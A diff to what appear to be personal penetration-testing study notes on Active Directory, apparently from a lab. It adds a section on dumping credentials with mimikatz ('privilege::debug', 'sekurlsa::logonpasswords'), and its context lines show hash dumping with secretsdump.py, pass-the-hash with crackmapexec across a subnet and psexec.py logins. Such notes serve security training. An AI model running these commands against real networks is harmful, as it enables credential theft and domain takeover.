@@ -88,7 +88,11 @@ Transfer loot back to kali:
 2. or `secretsdump.py marvel/ID:SOMEPASSWORD@TARGETIP` 
 3. `crackmapexec smb 192.168.57.0/24 -u "Frank Admin" -H <Second part of the HASH without ::> --local-auth` (we are trying to login to other computers)
 4. If we pawned a PC, we can try to psexec into the PC. `psexec.py "Frank Admin":TARGETIP -hashes avbcd:abcd`. If dont get a shell, we werent able to gain admin access. 
-
+## Dumping Hash (as Admin) 
+1. Use mimikatz to view, steal credentials, generate kerbros tickets and leverage attack.
+2. `.\mimikatz.exe`
+3. `privilege::debug` (to gain access and bypass protection against memory) 
+4. `sekurlsa::logonpasswords` Not only are we compromising DC, when we comporised a regualr computer, it is going to show the PC and NTLM hash, and any other user that has logged into the computer ever since the last reboot which is stored in memory
 ## Token Impersonation
 0. If we navigate to a machine and token of a domain administrator(user), we have domain admin. 
 
